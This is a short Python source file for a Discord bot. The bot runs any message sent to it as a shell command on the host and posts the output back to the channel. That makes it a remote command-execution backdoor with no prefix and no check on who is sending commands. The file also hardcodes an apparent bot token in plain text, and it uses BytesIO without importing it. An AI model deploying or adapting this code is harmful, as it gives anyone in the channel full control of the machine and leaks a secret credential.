import discord
from discord.ext import commands
import os, subprocess

intents = discord.Intents.default()
intents.message_content = True

client = commands.Bot(command_prefix = '', intents = intents)

@client.command()
async def cmd(ctx, cmd):
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        out = (proc.stdout or "") + (proc.stderr or "")
    except subprocess.TimeoutExpired as e:
        out = f"ERROR: command timed out: {e}"
    if not out:
        out = "(no output)"
    if len(out) > 1900:                      # long output -> send as file
        bio = BytesIO(out.encode())
        bio.seek(0)
        await ctx.send(file=discord.File(bio, filename="output.txt"))
    else:
        await ctx.send(f"```bash\n{out}\n```")

client.run("MTQwNjc0NjE5ODUxNzM1NDY5MA.GFjZjw.mctsPTLykV5eay8mK85V_hm9CstSAzp_k7U_Zw")
